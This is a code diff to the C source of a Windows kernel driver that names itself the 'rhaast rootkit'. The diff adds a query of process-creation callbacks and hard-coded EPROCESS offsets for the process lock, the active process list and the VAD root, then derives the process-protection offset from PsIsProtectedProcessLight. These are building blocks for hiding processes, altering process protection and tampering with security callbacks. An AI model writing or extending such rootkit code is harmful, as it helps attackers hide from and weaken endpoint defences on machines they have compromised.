@@ -24,6 +24,8 @@ NTSTATUS RhaastEntry(
         return NtStatus;
     }
 
+    RsCallbackQuery( PsCreationCallback, NULL, NULL );
+    
     /* init I/O communication over IOCTLs */
     if ( ! NT_SUCCESS( NtStatus = TsIoCtlInit() ) ) {
         PRINTF( "Failed init IOCTL communication: %p\n", NtStatus )
@@ -34,88 +36,56 @@ NTSTATUS RhaastEntry(
 
 /**
  * @brief
- *      initialize rhaast rootkit features
+ *      initialize rhaast rootkit features & data
  *
  * @return
- *      if successful executed function
+ *      status of function execution 
  */
 NTSTATUS RhaastInit(
     VOID
 ) {
     NTSTATUS NtStatus = STATUS_SUCCESS;
 
-    Instance.WindowsBuild = *NtBuildNumber;
-
-    /* set ProcessLock offset */
-    switch ( *NtBuildNumber  )
-    {
-        case WINBUILD_1507:
-        case WINBUILD_1511:
-        case WINBUILD_1607:
-        case WINBUILD_1703:
-        case WINBUILD_1709:
-        case WINBUILD_1803:
-        case WINBUILD_1809: {
-            Instance.Ofs.ProcessLock = 0x2d8;
-            break;
-        }
-
-        case WINBUILD_1903:
-        case WINBUILD_1909: {
-            Instance.Ofs.ProcessLock = 0x2e0;
-            break;
-        }
-
-        default: {
-            Instance.Ofs.ProcessLock = 0x438;
-            break;
-        }
-    }
-
-    /* set ProcessActiveList offset */
-    switch ( Instance.WindowsBuild )
-    {
-        case WINBUILD_1507:
-        case WINBUILD_1511:
-        case WINBUILD_1607:
-        case WINBUILD_1903:
-        case WINBUILD_1909: {
-            Instance.Ofs.ProcessActiveList = 0x2f0;
-            break;
-        }
-
-        case WINBUILD_1703:
-        case WINBUILD_1709:
-        case WINBUILD_1803:
-        case WINBUILD_1809: {
-            Instance.Ofs.ProcessActiveList = 0x2e8;
-            break;
-        }
-
-        default: {
-            Instance.Ofs.ProcessActiveList = 0x448;
-            break;
-        }
-    }
-
-    /* set other offsets
-     * NOTE:
-     *      I am using Windows 11 22h2 as my test machine so
-     *      i haven't set other offsets for other versions.
-     *      todo do it next. 
+    /* check if it's below Win11 22H2 since
+     * this driver only supports Win11 and above.
+     * Or well i only tested it on those versions
+     * and im too lazy to support older versions.
      */
+    if ( ( Instance.WindowsBuild = *NtBuildNumber ) < WINBUILD_1122H2 ) {
+        return STATUS_NOT_SUPPORTED;
+    }
+
+    /* try to get the ntoskrnl.exe base address */
+    if ( ! ( Instance.NtKrnlOs = RsKernelBase() ) ) {
+        PUTS( "Failed to get kernel base address" )
+        return STATUS_UNSUCCESSFUL;
+    }
+
+    /* set offets */
     switch ( Instance.WindowsBuild )
     {
-        case WINBUILD_1122H2: {
-            Instance.Ofs.ProcessVadRoot = 0x7d8;
+        case WINBUILD_1122H2: 
+        {
+            /* EPROCESS offsets */
+            Instance.Ofs.ProcessLock       = 0x438;
+            Instance.Ofs.ProcessActiveList = 0x448;
+            Instance.Ofs.ProcessVadRoot    = 0x7d8;
+
             break;
         }
 
         default: {
-            NtStatus = STATUS_NOT_SUPPORTED;
+            return STATUS_NOT_SUPPORTED;
         }
     }
 
+    /* get offsets dynamically */
+    {
+        /* dynamically get the offset for process protection
+         * SignatureLevel, SectionSignatureLevel and _PS_PROTECTION */
+        Instance.Ofs.ProcessProtection = DREF_U16( U_PTR( RsLdrFunction( H_API_PSISPROTECTEDPROCESSLIGHT ) ) + 0x2 ) - 0x2;
+    }
+    
     return NtStatus;
 }
 
@@ -128,9 +98,9 @@ NTSTATUS RhaastInit(
  *      DriverObject of the current rhaast rootkit
  */
 VOID RhaastUnLoad(
-    IN PDRIVER_OBJECT DriverObject
+    _In_ PDRIVER_OBJECT DriverObject
 ) {
-    PUTS( "Starting to unload driver & resources" );
+    PUTS( "Starting to unload driver & resources" )
 
     /* TODO: free up memory & resources */
 
